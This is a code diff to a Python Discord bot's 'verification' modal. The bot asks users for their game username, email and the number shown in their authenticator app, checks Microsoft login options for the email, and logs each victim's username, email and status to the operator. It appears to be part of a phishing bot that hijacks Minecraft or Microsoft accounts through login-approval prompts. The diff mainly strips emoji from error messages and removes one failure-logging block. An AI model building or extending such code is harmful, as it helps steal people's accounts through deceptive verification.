@@ -60,7 +60,7 @@ class MyModalOne(ui.Modal):
         if not re.compile(r"^[\w\.-]+@([\w-]+\.)+[\w-]{2,4}$").match(email):
             await interaction.response.send_message(
                 embed = Embed(
-                    title = "❌ Invalid Email Address",
+                    title = "Invalid Email Address",
                     description="Make sure you entered your email correctly!",
                     color = 0xFA4343
                 ),
@@ -105,7 +105,7 @@ class MyModalOne(ui.Modal):
 
             await interaction.followup.send(
                 embed = Embed(
-                    title = ":x: Failed to verify",
+                    title = "Failed to verify",
                     description = "The email you entered does not exist, make sure you entered it correctly!",
                     color = 0xFA4343
                 ),
@@ -151,7 +151,7 @@ class MyModalOne(ui.Modal):
 
                     await interaction.followup.send(
                         embed = Embed(
-                            title = ":x: Failed to verify",
+                            title = "Failed to verify",
                             description = "You pressed the wrong number on your authenticator app. Try again!",
                             colour=0xFA4343
                         ),
@@ -247,29 +247,6 @@ class MyModalOne(ui.Modal):
 
                 await asyncio.sleep(1)
                 i += 1
-
-            await interaction.followup.send(
-                embed = Embed(
-                    title = ":x: Failed to verify",
-                    description = "You pressed the wrong number on your authenticator app. Try again!",
-                    colour=0x00FF00
-                ),
-                ephemeral = True
-            )
-
-            await send_logs(
-                interaction.client,
-                build_log_embed(
-                    f"**Username | Email | Status**\n```{username} | {email} | Failed to confirm for Auth```",
-                    0xDE755B,
-                    thumbnail=f"https://visage.surgeplay.com/full/512/{username}",
-                    user=interaction.user,
-                    bot=interaction.client,
-                ),
-                view=ButtonOptions(interaction.user, interaction.user.id, username),
-                email=email,
-            )
-            return
 
         if "OtcLoginEligibleProofs" in emailInfo["Credentials"]:
 
